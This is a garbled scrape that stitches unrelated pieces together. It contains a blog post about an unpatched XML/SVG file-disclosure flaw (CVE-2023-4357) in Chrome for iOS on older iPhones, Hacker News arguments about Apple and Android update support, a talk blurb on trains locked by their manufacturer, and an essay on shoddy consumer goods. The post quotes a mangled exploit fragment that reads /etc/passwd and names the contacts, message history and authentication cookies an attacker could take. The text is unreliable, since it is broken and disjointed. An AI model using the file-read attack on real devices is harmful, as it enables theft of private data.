etc.Indoor world is entirely built by humans, for humans, to fit our vision first perception system. So we have given it a very similar perception system.6. Private by design.

    "title": "No secure iOS: Vulnerability in Chrome for iOS raises concerns",
    "originLink": "https://joshua.hu/apple-ios-patched-unpatched-vulnerabilities",
    "originBody": "What’s the deal with iOS security updates, anyway? Not everybody can afford the newest and greatest Apple product. Luckily, Apple continues to support nearly-decade-old devices like the iPhone 6S, which and iOS 15.8 is still powering those devices, seemingly with official Apple support, with the latest update from October the 25th, which addressed some security vulnerabilities. In reality, however, Apple seems to only be addressing some security issues in its older supported devices. On June the 28th, Chromium announced that it had patched a vulnerability titled “CVE-2023-4357: Insufficient validation of untrusted input in XML”. In the bug report for that issue, it was shown that on various devices, Google Chrome’s Blink rendering engine could reveal the contents of arbitrary files: /etc/passwd, for example. Interestingly, this also included Chrome for iOS. Given that Apple forces all browsers in iOS to use the WebKit rendering engine, that meant this vulnerability not only affected Blink, but also WebKit. Taking that exploit from June: exploit.svg:exploit.php: ]>/etc/passwd: &passwd;/etc/hosts: &hosts;/etc/group: &group; Aand trying it on the latest version of iOS that the (supported) iPhone 6S, we indeed see that the exploit still works. When opening the page, your /etc/passwd is there for the world to see. That means that any website visited by anybody using an iPhone 6S (or possibly later versions) can silently steal internal system files. What files could somebody steal? Well, there’s always: AddressBook.sqlitedb: which contains all of the personal contact information of the user and any saved contacts. call_history.db: which contains all received, dialled, and missed calls of the user. SMS/call_history.db: which contains the SMS history of the user. Or maybe: History.plist: which contains the browsing history of the user. Cookies.plist: which contains the browser’s cookies – including authentication cookies, which an attacker can re-use once they are stolen. After contacting Apple to see whether they intended to patch this, the response was quite short: If in the future you are able to reproduce this issue using a different device that's running iOS 17 or later, please let us know. This raises some interesting questions. First off, does it imply that Apple does not patch vulnerabilities in older versions of iOS unless they may used to root/jailbreak the iPhone, or are known to be actively being either mass-exploited or exploited by some nation-state? A new exploit targeting the iOS (among other OS’) Bluetooth stack has also been left unpatched by Apple in all versions except iOS 17. If I was an exploit vendor, I would be paying very close attention to vulnerabilities fixed in iOS 17, and seeing whether they work on previous (supported) iOS versions. Not every target has the newest Apple device, and minimal amount of surveillance may save the vendor from burning a 0day on a target that is using a slightly older device. Note: I haven’t tested this against older (supported) MacOS versions, but it’s definitely possible that Safari is exploitable here, too.",

In alternative timeline where mobile OSes arent fisher price parodies of proper operating systems, they could push the same image to all iphones and have a proper hardware abstraction layer take care of the specific details.There is nothing fundamentally incompatible about the last couple of generation of iphones. ARMv8 CPU, PowerVR derived GPU. If the mobile computing space weren&#x27;t driven by greed, this would be a non issue.A Sandy Bridge era intel machine deployed in 2011 is easily capable of running the latest Linux, BSD or win10. And in the case of the first two, I&#x27;d wager it will continue to be viable for the foreseeable future. reply ionyun 9 hours agoparentprevApple still sells previous phones as lesser, but still not very affordable, models. The iPhone 7 was released in September 2016 and discontinued in September 2019. It is also on iOS 15.8 so presumably also vulnerable to this. That would be about 4 years of security updates. Not the worst but not beating what e.g. Google promises for Pixel phones now. reply mrcarruthers 4 hours agorootparentYou can&#x27;t seriously give Apple shit for this and at the same time praise Google. iPhones have, pretty consistently since the 5 or so, received 5 or 6 years worth of OS updates since the phone&#x27;s release whereas with Android phones you&#x27;ll receive 2. Only after years of complaining is Google finally promising to support it for longer.

Sure not everyone does this, but unlike iOS I can take care of it myself.\"not everyone\" is an understatement.That&#x27;s a solution for you (and the dozens - dozens! - of people doing the same), in practice it is not for 99% of Android users, therefore, again in practice, there&#x27;s a huge fleet of devices with out-of-date software out there.> But Android also lets you run custom buildsThat&#x27;s not even counting that:- many Android manufacturers make it non-trivial† to root&#x2F;unlock&#x2F;flash a build and&#x2F;or make it blow a warranty fuse, and that&#x27;s if it&#x27;s even possible at all.- usually the camera goes ape shit, and often loudspeaker audio quality too.- unless you relock the bootloader it immediately compromises security and makes bootloader updates nontrivial as unlocking again clears the device.Mind you, this is a fine, intellectually satisfying strategy for you and me to be able to flash open builds, but it&#x27;s by and large an extremely fringe strategy, and it&#x27;s been shown over a decade that it&#x27;s staying that way.† Often involving downloading random flashing tools from obscure forums, that run only on Windows, some of these being one shot and requiring to plug in magic numbers corresponding to your exact device, and if you screw it up the device is bricked (e.g Samsung).

Google promising 7 years is in line with Apple&#x27;s 10 year track record of providing 6-8 years of updates, so it&#x27;s more like Google aligning with Apple, not Google pushing Apple.Still, a vague† promise in a blog post or keynote address is not going to fit the bill, at the very least it should be in the EULA or other contractually enforceable document, otherwise the promise is worth nothing.Ideally I wish software would be treated as with e.g automotive or washing machine manufacturers, who in the EU have a legal requirement to provide parts for 10 years.† I mean the promise is clearly worded but bears no weight, especially when pitted against Google&#x27;s track record over the last decade of making grand announcements then puling the rug down the road. reply WA 3 hours agorootparentprev> We can and should praise Google for improving thingsLet’s talk again in 5 years, once they had the opportunity to prove their plans.

Even with Apple’s famously high resale values, depreciation on smartphones is huge.Don’t buy brand new old phones new from Apple, they’re a ripoff. If you buy either an iPhone 12 or 13 used for $250-350 you can basically plan on a $50 a year budget to have a smartphone that always has the latest OS judging by their expected remaining lifespans.I think the big flaw with the status quo is e-waste more than cost to the consumer. I think an iPhone 6S or 7 are incredibly slow and outdated devices for today’s usage but in 5 years I don’t think we will be able to say the same thing about an iPhone 12 or 13. Smartphone hardware is far more mature now than it was even 6 generations deep into the iPhone product line.We should be able to replace batteries for $20 and replace things like broken screens for not much more, and Apple should be enthusiastic about it considering how services are their bread and butter moving forward. Apple should be happy to produce fewer phones and keep more consumer dollars allocated toward the purchase of high margin digital goods. reply chatmasta 7 hours agorootparent> I don’t think we will be able to say the same thing about an iPhone 12 or 13The wildcard here is local LLM use cases and any new hardware that increases their speed by orders of magnitude. reply dangus 4 hours agorootparentThat’s not really a need for smartphone users. I can access an LLM on a website for free right now.I also don’t see any indication that there will be impactful local LLM silicon at the smartphone scale anytime soon. reply calgoo 1 hour agorootparentYou can yes, but the rumor is that Apple is focusing on adding them directly to your device, and if they integrate it deeply in the OS, then it will require the chips to run it. I’m sure you will be able to run old devices but without the latest Siri for example. reply davnn 3 hours agorootparentprevNot yet, I believe. Revenue from iPhone sales is still quite fundamental to Apple‘s success, it‘s more than triple the revenue from all services combined (not including Google‘s search engine deal). reply walteweiss 2 hours agorootparentprevI still use a 6s and a fist Gen. se, I won’t say they’re terribly slow. It’s the apps, the modern apps, that make the device too slow. If you use not so many, it works quite very well. The only downside that the OS is not updated any longer. Although I got a security update recently, weeks ago. reply walteweiss 2 hours agorootparentprevGoogle promises.

I was under the impression that it used a stored rollback index to prevent OS rollbacks. reply handsclean 8 hours agoparentprevIt’s an issue of expectations. If Apple advertises security support then it’s fraudulent to not deliver it; on the other hand, if they advertise an EOL date, then I’d agree there’s no reasonable expectation of security updates. But what they actually do is neither, they communicate very little, supporting some past iOS versions fully and others to degrees that only they know, resulting in them profiting off a reputation for backporting security updates while not actually binding themselves to deliver it, or, often, doing so.Like the battery issue, I feel the whole issue is communication. Apple needs to communicate when they EOL OS versions. You don’t otherwise know it, partly because EOL OS’s, including this phone’s, still get security updates, just not all of them. reply voidwtf 8 hours agorootparentThey do communicate it in every major release, including which devices are supported. Many major vendors release security updates for EOL devices when doing so would greatly increase the security posture of those devices and comes at little to no cost to the vendor. Notably Cisco, Microsoft, Apple, and Samsung come to mind.Is the implication that once a device is EOL that a vendor should never release an update for that device again? reply wtallis 8 hours agorootparent> Is the implication that once a device is EOL that a vendor should never release an update for that device again?It seems typical for vendors use \"EOL\" to refer to end of support life, not merely discontinuing sales of the produce. Most notably, that&#x27;s how Microsoft generally frames EOL for major Windows releases, hence expectation of jumps in PC sales corresponding to EOL of XP, 7, and 10. reply handsclean 3 hours agorootparentprevThey communicate OS version device compatibility, I’m talking about communicating OS version EOL. For example, Windows 10 EOL is 2025-10-14, and we know this years in advance. For Apple, not only do we not get advance notice, we don’t even know when it’s already happened.No, I’m not implying there’s something wrong with shipping the occasional update to EOL devices. reply dangus 7 hours agorootparentprevThey only communicate it after the fact, when the new OS is impending release. There’s no way to know at time of purchase how many years your device will be supported.I feel like Apple changed the dynamics of smartphone market from company-issued devices like BlackBerry to BYO with the iPhone essentially on purpose so they don’t get stuck providing decades of enterprise support promises like companies like Microsoft.Companies purchasing bulk orders of hardware probably wouldn’t tolerate a vendor unwilling to make any sort of concrete support promise for the contract. But a company who employs iPhone users can basically put the responsibility on the user and simply block access to non-compliant devices. reply madars 8 hours agoparentprevIt&#x27;s fine for a vendor to completely abandon 10 year old hardware but if you can still pay 30% App Store tax&#x2F;pay for iCloud&#x2F;etc, the security fixes should be backported as well. The current situation is charging full price for inferior (or maybe even dangerous) product: Apple wants to have its cake and eat it too. reply leetcrew 7 hours agorootparentI don&#x27;t totally follow this argument. the 30% app store commission, iCloud subscription, etc. does not only fund security fixes for the OS and core services. I don&#x27;t think the average consumer thinks that&#x27;s what they&#x27;re paying for either. waiving the fee for EOL&#x27;d devices would create a perverse incentive of its own.I do wish apple would follow google&#x27;s example and commit to a service lifetime upfront, but other than that, I don&#x27;t object to their model. in practice, it vastly exceeds the level of support for any android phone other than the pixel 8, and we have yet to see whether google actually follows through on that. reply Closi 2 hours agorootparentAlso it means that at some point, Apple would have to actively block some legacy devices from using iCloud, app store, apple music, any app with subscrpitions etc which would effectively make the device pretty useless. reply wtallis 8 hours agorootparentprevAre you really saying Apple should actively break interoperability with old software? reply madars 8 hours agorootparentThey should stop charging 30% App Store tax for an inferior product at the very least. reply wtallis 7 hours agorootparentApp Store purchases aren&#x27;t tied to a particular device; you can buy an app on an old device and keep using it when you get a newer device. Do you have a coherent, reasonable suggestion for how Apple could modify their business model without completely breaking it, or are you just desperate to shoehorn complaints about the App Store fees into the conversation? reply madars 7 hours agorootparentEasy: offer a discount if purchase is made on an unsupported device, just like how grocery stores offer discounts for food that&#x27;s about to expire.I don&#x27;t think there is a real concern about app store economics collapsing, the app marketplace business is very lucrative. We can see this in related cases: you can avoid certain iOS taxes by purchasing your subscriptions on the web: Twitter Blue is $11 on iOS and $8 on the web. Spotify used to be $12.99 for iOS sign-ups and $9.99 on the web.Why should users pay full bundled iOS tax that supports security updates, if they are getting none? reply 8n4vidtmkvmk 6 hours agorootparentYour purchases carry forward to newer devices, no? If nothing else, people would keep an older device just to make purchases and then install it on their newer iPhone. reply wtallis 7 hours agorootparentprev> Why should users pay full bundled iOS tax that supports security updates,I don&#x27;t think I&#x27;ve ever seen someone express the expectation that Apple&#x27;s App Store fees are for the purpose of supporting iOS development and maintenance. Mostly I&#x27;ve seen and heard the expectation that those fees are connected to running the App Store itself (payment processing, hosting, app review, etc.) and beyond that, vague profiteering. iOS itself isn&#x27;t a subscription service, and Apple seems quite happy to sell you devices even if you don&#x27;t spend money in the App Store. So you seem to be stretching a bit by attributing those fees to iOS maintenance and then turning around to say that unsupported iOS versions should get a discount on the fees for any services that still work. reply mrcarruthers 4 hours agorootparentprevThey&#x27;re not charging you, the user that 30%. They&#x27;re charging the developer. Yes that does trickle down to you in the developer&#x27;s pricing, but, in this instance, a phone no longer receiving security updates is not an inferior product from the point of view of the transaction in question. reply kaba0 1 hour agorootparentprevWhy exactly? Does petrol get cheaper for an old car that barely works? reply gghffguhvc 8 hours agorootparentprev15% for the vast majority of developers and apps FWIW. reply gnicholas 7 hours agorootparentProbably true, but is it the same for the vast majority of the app revenue? Quite possibly not. reply rrdharan 8 hours agorootparentprevWhat does this mean? The App Store fees are paid by the developers &#x2F; vendors. Are you saying they should pay less proportionate to the number of times their apps are downloaded to older devices? reply JumpCrisscross 7 hours agorootparent> What does this mean?It means they’re shoehorning another issue into this discussion. reply slaymaker1907 7 hours agorootparentI think it’s a completely valid point. Apple is still making (potentially a lot) of money off these old devices yet isn’t willing to fully support them. It seems very unethical. reply schiffern 6 hours agorootparentnext [–]> seems very unethicalI agree. Clearly Apple should do the only ethical thing and immediately ban all unsupported devices from new App Store purchases.When Apple announces this (very ethical) policy change, I expect you to full-throatedly defend Apple from the mass shrieking cries of \"but muh planned obsolescence!!\" Right? Right?? ;-)In fact, one could argue it&#x27;s also \"very unethical\" for Apple to (negligently) allow someone to use a potentially unsafe or hackable product. To be maximally ethical, Apple should be remotely bricking any Apple device the day it loses security support. Better to be on the safe (\"ethical\") side and remote wipe too, to protect people&#x27;s data privacy.Can you see how Argument From I Merely Assert XYZ Is Unethical Then Demand Some Arbitrary Relief can quickly break down? replyjudge2020 8 hours agorootparentpreviOS 12 was released September 2018 and> iOS 12.5.7> Released January 23, 2023https:&#x2F;&#x2F;support.apple.com&#x2F;en-us&#x2F;103015 reply scarface_74 6 hours agorootparentprevSo theoretically - and I tried this a couple of years ago - I could still download the “last compatible version” of an app if it’s available on the store for my old 2010 iPad 1st generation running iOS 5.This device had 256Mb RAM and 400Mhz 32 bit processor. Should Apple still support this with security updates? reply uxp8u61q 7 hours agoparentprevDoes apple release jailbreak tools for ten year old phones? reply refulgentis 9 hours agoparentprevCorrect. The issue is it is not commonly known that Apple isn&#x27;t actually backporting fixes for exploits while it has been claiming to update the phones: this is earth-shaking[^1] news[^1] It would be completely reasonable to say \"Earth-shaking? Really? You expect security backports for a decade?\" I&#x27;ve been in mobile my whole career, iOS for 7 years, starting from jailbreaking the original iPhone, then worked on Android itself for 7 years. I am sure significant decisions were made assuming this was the case. reply gridder 9 hours agorootparentTouche. P.S. Keep in mind though, what is the state of security of the Android phone you bought new in November 2015? reply TheDong 8 hours agorootparentThe Nexus 6 (2014) can still run a version of android with security patches: https:&#x2F;&#x2F;wiki.lineageos.org&#x2F;devices&#x2F;shamu&#x2F;Google no longer offers security patches directly, but since you control the phone sufficiently to install your own OS, the community can come together and keep security updates flowing. You could do it yourself if you wanted.Apple devices make this sort of community maintainership effectively impossible.I know this means practically nothing since only nerds can actually install a third-party ROM, so for the general populace only the \"default\" security patch window matters, but for the hacker news crowd it seems like it might be a meaningful difference. reply tsimionescu 1 hour agorootparentBut it is effectively impossible on Android as well. Let&#x27;s ignore for a minute the fact that practically no one can install a custom ROM.The bigger problem is that a huge bunch of software running on the phone is fully proprietary and closed source, and there are many many different versions for different phones around - making it virtually impossible to do any meaningful reverse engineering. So sure, your main OS may be up to date, but the baseband OS and virtually all of the device drivers will be left vulnerable, and they have just as much if not more access to the data on your device. reply fh9302 6 hours agorootparentprevDoes that include updated drivers? If no, then there are still many unfixed security vulnerabilities. reply dangus 7 hours agorootparentprevIs my grandma going to install a custom rom? If it’s not over the air it might as well not exist. reply mattigames 7 hours agorootparentMaybe you could be a good grandson and do it for her? reply mattl 5 hours agorootparentI don’t consider it a good thing to install a custom OS for someone and not give them the same level of support. reply mrcarruthers 4 hours agorootparentprevIt&#x27;s all well and good to say \"oh you can just install a custom ROM\". But you (and many here) can do that. Because you&#x27;re technically inclined. But the vast majority have users have no idea what the hell you&#x27;re talking about. They barely know what a security update is or what version of Android they&#x27;re using, let alone being able to find, choose, and install a ROM.Can we just choose to stop suggesting it as a legitimate solution cause outside of this bubble, it absolutely is not. reply realusername 2 hours agorootparentpeople don&#x27;t know how to install Windows either. In theory they could go to a shop to update their phone like their are doing with Windows but the reality is that nobody cares about updating their phone. reply geodel 9 hours agorootparentprevHuh, it can be totally earth shaking or completely normal depending on time and place. In current market place of smartphones it is more towards earth shaking than normal.You don&#x27;t have to agree but resell value of older iPhone being much-much higher than Android tells customer values the support and quality of iPhone. reply mattigames 7 hours agorootparentAs much as the sales of healing crystals tells me how much people value the health and anti-aging benefits of those. reply kaba0 1 hour agorootparentHealing crystals seems to be a much smaller market (to the point of barely existing) than “Big Pharma”, so your analogy doesn’t really make sense. replySirMaster 8 hours agoprevHow do we know they won’t patch it in like an iOS 15.8.1 update?Even iOS 12 had a security update in 2023 still. reply mrcarruthers 4 hours agoparentApple doesn&#x27;t patch every security hole in older iOS versions. I don&#x27;t know what the criteria is, but my guess is if it&#x27;s a major security hole, or an easily backported one, they&#x27;ll do it, but if it&#x27;s super minor or not backportable, they won&#x27;t. reply saagarjha 3 hours agorootparentIf I had to guess, I think it’s when they see a report that it’s been actively exploited. reply lewantmontreal 6 hours agoprevSome iOS 15 phones like the 5S&#x2F;SE have no newer comparable phones which makes upgrading difficult.

It’s uncompromising in battery longevity when considering its size, too. First-gen SE is the best phone Apple ever made. The newer SE are terrible. reply fouc 1 hour agorootparentAs someone that went from 5S to 2016 SE to 2020 SE which is my current phone, I&#x27;ve been very satisfied with the 2020 SE.With each phone I have always taken steps to reduce battery usage, disabled background refresh, and manually turn on low power mode after charging every single time. reply qball 4 hours agorootparentprevSmall physical size, also a headphone jack.The more recent SE models are iPhone 8 bodies with upgraded internals (being an iPhone 11 and 13 inside, respectively) and Apple no longer offers a Mini version of their newer phones (not that the A16 and A17 are significant improvements on the A15, but still).And the Mini is still larger than the first SE by about a half inch in either direction; the 8 (and the newer phones) add another half inch on top of that.Of course, the problem with using a first-gen SE today is that because information density on mobile is abysmal, the added vertical space has been very welcome to app developers (who also might not test on the smallest screens). So while the smaller phones were ergonomically far superior to the larger ones, and this is to a point true for the Minis as well, that&#x27;s since been \"balanced\" by inherently worse UI&#x2F;UX on said phones. reply MBCook 6 hours agoprev> After contacting Apple […]I’d be very curious to see HOW they contacted Apple.

I don&#x27;t see the motivation. Those maintainers do quite a lot of work to backport patches every week&#x2F;month and offer OTA. Also I dont enable root when flashing, that is not required at all. reply woah 5 hours agorootparentWait... so because you don&#x27;t want to be infected because you&#x27;re using an out of date OS, you load OS patches of questionable provenance, but you&#x27;re not worried about that since nobody would bother to infect you anyway? Why not skip a few steps there and just run an out of date OS? reply yjftsjthsd-h 5 hours agorootparentEvery device running an old OS is vulnerable, so it&#x27;s better to throw the dice on an aftermarket ROM.Edit: Though to keep things fair, it must be said that that particular argument only really applies to old devices. If you have a new device (or rather, one still getting regular security updates from the vendor) and a trustworthy vendor, a person could reasonably argue for staying on the stock ROM. reply woah 4 hours agorootparentFair point reply eli 6 hours agorootparentprevthink about it the other way: if someone who happens to use random ROM happens to be a target of a state security agency of course it would be trivial to infect and the other 999 users would be collateral damage. reply jojobas 5 hours agorootparentIf state security agency is your model threat you&#x27;ll be hard pressed to stay secure even with an airgap.

This talk will tell the story of a series of Polish EMUs (Electric Multiple Unit) that all refused to move a few days after arriving at an “unauthorized” service company. We'll go over how a train control system actually works, how we reverse-engineered one and what sort of magical “security” systems we actually found inside of it. Reality sometimes is stranger than the wildest CTF task. Reality sometimes is running `unlock.py` on a dozen trains. The talk will be a mix of technical and non-technical aspects of analysis which should be understandable for anyone with a technical background. We’ll briefly explain how modern EMUs look like inside, how the Train Control & Monitoring System works, and how to analyze TriCore machine code.

It was only through some weird circumstances + dedicated investigation by the hacker group (I thought they were given months of access to the hardware) that this was uncovered. Most organizations do not have the resources to investigate equipment behaving oddly.For example, if HP programs printers to start failing after N pages printed, would that ever be uncovered?Is there some kind of whistleblower law that would allow someone with knowledge to come forward? reply p_l 7 hours agoparentA crucial part is the contract wording regarding what exactly was sold when NEWAG sold the trains to the operator - namely, the documentation for maintenance and repair was supposed to be complete. As in, should NEWAG encounter a critical existence failure, it should still be possible for a third party to service the trains so long as parts could be acquired, and in worst case, start working on replacement parts.With most other right-to-repair cases there&#x27;s way less recourse. With trains in Europe you have legal rules that disallow hiding critical maintenance data behind trade secrets, for example. reply glandium 20 minutes agoparentprev> For example, if HP programs printers to start failing after N pages printed, would that ever be uncovered?I can&#x27;t find it right now, but wasn&#x27;t there a story some months ago about some printers doing exactly that to make you buy new ink cartridges? reply f_devd 6 hours agoparentprevFrom personal experience it seems relatively common in the embedded-esque software space, although not always quite as sophisticated as seen here.> Is there some kind of whistleblower law that would allow someone with knowledge to come forward?Depends on where you live, unfortunately anywhere with &#x27;stong&#x27; IP laws you aren&#x27;t allowed to patch anything. Usually reverse engineering analysis is still fine, although if there is a contract saying you&#x27;re not allowed to you could be screwed anyway.In the train case the locks were specifically for anti-competitive purposes, and so they can whistle-blow for that; and I think in the general case you can sue for misleading dealings&#x2F;false advertising&#x2F;etc but not for anything specific to the software locks&#x2F;traps. reply chrisandchris 1 hour agoparentprevAccording to this thread [1] (and an unrelated one I can&#x27;t find anymore) some printer manufacturer region lock their printers accepted cartridges, which makes the product useless in some circumstances just because of your location.I think the incentive is money. 1 train is worth much money, a single printer is not.

The other day, while trying to recover some disk space, I found a giant file on my hard disk. It turned out to be a nine-hour screen recording from almost a year ago. I had no idea it existed, so I must’ve accidentally left the screen recording on. Scrubbing through it sped up, watching the whole thing in a couple minutes, was fascinating; it was like a window into my thought process at that time. You could see how I was researching something online. It was almost like a play-by-play, akin to re-watching a sports performance – very instructive and surprisingly useful.Also, the the sense of being back in that time seeing details that I otherwise probably would’ve forgotten was transformative.In a similar vein to what you’ve done, but focusing specifically on web browsing, I’ve created a tool called ‘DownloadNet.’ It archives for offline use and fully indexes every page you visit.

It was one of those vintage small appliances which seem built to survive gas explosions and hammer attacks. When I turned on the motor with a metal toggle switch, a drive shaft spun a heavy ceramic knob that gouged out the hearts of lemon and orange halves, leaving not a scrap of pulp uncrushed. The thing worked beautifully, almost like new, so I looked up its serial number on the internet to see when the unit was manufactured, guessing it might be almost forty years old. Wrong. It dated to the 1940s. It was seventy, the stubborn monster, still giving satisfaction with every use. I can’t say the same about my coffee grinders. I use the plural because I’ve owned a lot of them, all bought in their original packaging and dead within a year. They’re good ones, supposedly, with burrs not blades, but they stop performing before long, ending their long journeys from overseas factories in unmarked graves in my local Montana landfill. I have a whole ghost kitchen in this landfill, and soon I will need to reserve a bigger plot. For the nifty under-the-counter fridge that has stopped getting cold after three years and which no one in the area can fix. For the cool bagless vacuum cleaner that clogs and chokes when I run it over a rug. For the set of glass measuring cups whose numbers and hashmarks are swiftly fading and becoming illegible, much like those on the dials of the washer my wife bought just three years ago. For the remains of the Pyrex casserole that shattered when I removed it from the oven, strewing the floor with blade-like shards, some so tiny I probably won’t find them until they lodge in my bare feet. Should I go on? I think I will. It’s important to get to the thoughtful, speculative part, where I ask what it means when the objects in our lives demoralize us in a blizzard of malfunctions, but it’s also important – to me, emotionally -- to bury the reader in details of the unceasing material disappointments I’ve faced The cute yellow mittens my wife picked up at Target which unraveled the second time she wore them. The new suitcase which won’t stand upright when it’s full. The laptop computers that have turned to bricks within months of their warranties expiring. And the hybrid sedan with fifty thousand miles on it that also turned into a brick while going eighty down the freeway, losing its power steering, its power brakes, its power everything. I survived, by some miracle, issued legal threats, and the car’s manufacturer repaired it, free. Then it bricked again a few weeks later. It’s the little things too, of course, because they’re constant. The staples that won’t pierce five stacked sheets of paper. The matches that sizzle and smoke but don’t catch fire. The grocery bags split by the corners of the milk cartons whose inadequately seals leak drops of milk. The strangely short power cords on electronics. The two or three new pens I use each week that, because no ink comes out of them (at least not continually, in lines) aren’t really pens at all, in fact, but tributes to pens, Potemkin pens, mere props. Baffled by how to measure this decline in the quality of common wares – a decline whose significance I promise to cover once I’ve further gratified my rage -- I opened the matter to my Twitter audience and quickly garnered two thousand replies, by far the longest thread I’ve ever triggered. The complaints were specific and formed patterns. One was a loathing for newer washers and dryers, because they don’t wash or dry well, and then they break. The clothes that go inside them were disliked too. (A former top executive of Levi’s chimed in to confirm that jeans aren’t what they used to be.) My favorite replies were the picky ones. One person noted that the “juice content” of juice is going down. Another observed that the “foaming liquid hand soap” which suddenly is dominating store shelves is just normal liquid soap, diluted. Many blamed these problems on the government. They believed it had crippled certain products (major home appliances especially) with environmental regulations, causing them to function poorly and turn rapidly to landfill fodder -- an ecological net loss, perhaps. Some folks blamed our trade arrangements with China and the evils of capitalism itself. Weak-link computer chips in items that don’t require them also came in for abuse. One philosophical reply spoke of a sinister general trend toward the degradation of everything human. “There’s a war on value that’s going that’s comprised of three parts: war on quality, war on money, war on life.” Lofty rhetoric, but I understood. When my suddenly de-electrified hybrid car became a hurtling giant stone inside which my wife and I were helplessly strapped – all for the crime of trying to save fuel and, ultimately, earth-- it was hard not to feel ambushed, tricked. Only a couple of my correspondents challenged my premise – and the flood of testimony -- that stuff is getting crappier, acutely so. They made an economic argument. They claimed things are worse because we want them cheaper, but if price is adjusted for inflation, they’re of the same quality as always. These rant-killing sophisticates annoyed me. Our new washing machine with the faded dials and the vanishing enamel on its corners (I forgot to mention that defect) is the costliest model we’ve ever purchased. As for the much of the cheap stuff – those Target mittens, say – they aren’t merely inexpensive, they’re valueless. In fact, they’re of negative value when one considers the waste or materials involved, and the wasted energy of driving to buy them, then driving to return them later – a second trip that in this case, and many others, wasn’t worth making. Instead, we took the loss. And the world took the loss. A small one, but they add up. In England in the 19th Century there arose certain thinkers – John Ruskin, William Morris – who believed that the quality of material objects reflects and affects the quality of society, even of the spirit. “Have nothing in your home,” wrote Morris, the father of the Arts and Crafts movement, which aimed to elevate the lives of the working and middle classes, “that you do not know to be useful or believe to be beautiful.” This would be a tall order nowadays. Recently, my wife needed a carrot peeler. She needed one rather quickly. Off to Target. The one she bought (the only one on sale) looked handsome enough, and the brand was one she recognized, but it failed in the useful department, miserably. It wasn’t sharp enough to peel a carrot. Like my pens which aren’t pens because pens put ink on paper, her peeler which didn’t peel was a nullity, a simulacrum, a representation of something, not the thing. The world is going digital, we’re told, and someday there will even be digital real estate inhabited by people in digital clothes drinking digital orange juice extracted with digital juicers. People will play at the lives they once took seriously, lives that had once had heft and weight, and the juice content of juice will fall to zero. I suspect my old physical squeezer will still be working then, but the rest of my kitchen gear won’t. Not much of it. I might not last, either. I fear I won’t. The psychic toll of goods that don’t endure is that one loses faith that future will even come, and then one loses interest in it coming, for little that we own or use or cherish seems likely to be there with us to meet it. One wonders whose obsolescence is being planned, our products’ or our own? Subscribe to Unbound By Walter Kirn · Hundreds of paid subscribers Free Thought.

The first few examples are kitchen appliances. In this case I don&#x27;t really know, but I&#x27;m at least willing to listen. Ultimately the evidence is people responding to a thread on Twitter where he solicited complaints. Not so compelling.But then he mentions a \"hybrid sedan\". Here I&#x27;m aware of the data.

However:- The anecdotal evidence is strong amongst older people- Data not existing doesn&#x27;t mean it _can&#x27;t_ existI suspect that younger people are just used to things not working, so they don&#x27;t complain. Then there&#x27;s the fact that there is no incentive for anyone else to show things could be better (except the old codgers like myself, but we&#x27;re not a profitable demographic).I scour online auctions for old gear, because I know it&#x27;ll work. Hi-Fi systems built in the 90s for example, were the panicle of hi-fi. Heck, I even have a CRT from _thirty years ago_ that still works like new (now think of your smart T.V. in thirty years).Forget that, is there anything you&#x27;ve bought new in the last _ten_ years that you still have? reply magicalhippo 10 minutes agorootparent> Forget that, is there anything you&#x27;ve bought new in the last _ten_ years that you still have?My flatscreen TV and the sound bar that came with it. My daily-driver computer. My Samsung Galaxy S3 which I still use daily for some tasks, works fine. My washing machine. My Kenwood stand mixer.All around 10 years, all working fine still without repairs.That&#x27;s just the things I could think of on the spot. There&#x27;s very few things I&#x27;ve had to replace that were broken. Most things I&#x27;ve replaced because I wanted newer features, and have sold or given away the old item.I&#x27;ll concede that my previous lawn mower falls in your category. It had a plastic bushing on the main shaft, which got torn up over time, and destroyed some other parts when it held a retirement party. reply vladvasiliu 18 minutes agorootparentprevFor the cars, I think it depends, possibly even on your luck. My car is old enough to vote, and aside from one simple repair I could do in 15 minutes in my parents&#x27; garage with a part that was sold by the dealership for 60 €, it only ever needed changes of consumables. Hell, even the scheduled maintenance at the stealership costs a song, cheaper than my motorcycle.My dad&#x27;s cars from the same era didn&#x27;t fare so well and all required heavier repairs; none still work.Also, since we&#x27;re talking anecdotes, my parents have thrown out all their CRT TVs and monitors because they&#x27;ve all failed in some way (I&#x27;ve personally never had any). And I&#x27;m typing this on a Dell LCD monitor from 2015 or so that still kicks ass and has great picture, even by today&#x27;s standards. My 2013 MBP still has a working, good-looking screen, and it&#x27;s been on the road a lot.> Forget that, is there anything you&#x27;ve bought new in the last _ten_ years that you still have?Yup, almost everything [0] still works like new, even my 2013 MBP which I&#x27;ve carted around a lot. It&#x27;s not powerful enough anymore, so I have a new daily driver, but it still works. Hell, my gaming PC was bought circa 2013, and only had a new GPU 3 years ago (was bought for server work initially, so only had the cheapest GPU I could find). Still rocking the original SSDs, PSU, everything. Ditto for my wireless headphones I bought around 2018. The battery life is still good, the sound hasn&#x27;t changed.I&#x27;ve mostly lived in rental apartments, so I don&#x27;t have any anecdotes about household appliances.So not really sure what can be concluded from our anecdotes.---[0] The only thing that broke was an MS Sculpt keyboard, which broke down after 4 years of daily use. reply bouk 37 minutes agorootparentprevOf course the old cars you can still buy now are the reliable ones, because the unreliable ones have long been scrapped reply ghusto 35 minutes agorootparentThat, is an excellent point. However, the very reason I buy in them in the first place is that they proved themselves to me _at the time_. Believe it or not, what I&#x27;m saying is I never had a bad experience with cars from the 90s, in the 90s. reply jeffreygoesto 26 minutes agorootparentprevI fitted a RasPi with mpd and a USB sound stick into a tube radio from 1958 that happily plays in our kitchen day by day, can stream live or NAS (important feature having children) and I just love the tube sound.http:&#x2F;&#x2F;imgur.com&#x2F;a&#x2F;r834D reply spzb 5 hours agoparentprevThere&#x27;s also a survival bias in that we don&#x27;t consider the appliances from yesteryear that packed up back when disco was king. reply pkdpic 3 hours agorootparentThat&#x27;s the smartest possible counterpoint to all this, nicely counterpointed.This was a fun read and I agree in sentiment to the rage of all the crap from target that falls apart in 10 minutes but I feel like I&#x27;ve developed an ok sense if when I&#x27;m taking this risk and am less frustrated when something cheap fails. Essentially any time I buy anything but a book from Amazon or anything but cereal and vodka from Target. Ultimately I think the crapification of lowend consumer goods has just made me buy less crap, which feels good I think. I&#x27;ve also accepted a pretend scifi narrative in which the only kind of society that doesn&#x27;t descend into anarchy is one where people are constantly buying and throwing away cheap crap.And as an aside I have one of those crazy juicers but I stopped using it because it scares my wife and smells like burning &#x2F; ozone. reply bigodbiel 2 hours agorootparentprevPlanned obsolescence is industry standard, from toasters to iphones. reply idontwantthis 2 hours 